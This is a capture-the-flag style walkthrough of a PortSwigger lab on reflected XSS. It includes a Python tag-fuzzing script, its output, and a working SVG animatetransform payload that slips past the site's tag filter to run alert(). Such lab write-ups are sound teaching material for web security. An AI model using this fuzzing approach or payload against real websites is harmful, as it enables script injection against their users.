# Reflected XSS with some SVG markup allowed

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed), you'll learn: Reflected XSS with some SVG markup allowed! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert()` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231080001.png)

In here, we can see there is a search box.

Let's try to inject some JavaScript codes:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231080033.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231080042.png)

However, the application blocks us.

**To see which tags are allowed, we can fuzz it via a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(tag):
    payload = f'<{tag}>'
    url = f'https://0a89003e042b9254c06b9f6200a2001a.web-security-academy.net/?search={payload}'

    requestResult = requests.get(url)

    if 'Tag is not allowed' not in requestResult.text:
        print(f'[+] Found valid tag: {payload}')

def main():
    # From PortSwigger's Cross-site scripting (XSS) cheat sheet:
    # https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    listTags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']

    for tag in listTags:
        thread = Thread(target=sendRequest, args=(tag,))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Cross-Site-Scripting]
└─# python3 tag_fuzzing.py
[+] Found valid tag: <animatetransform>
[+] Found valid tag: <image>
[+] Found valid tag: <svg>
[+] Found valid tag: <title>
```

**Now, we can go to PortSwigger's [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to choose which payload work for us.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231082247.png)

**Let's try `<svg>` and `<animatetransform>` tag:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231082322.png)

**This payload looks good. Let's try it:**
```html
<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231082346.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231082352.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-19/images/Pasted%20image%2020221231082412.png)

It worked!

# What we've learned:

1. Reflected XSS with some SVG markup allowed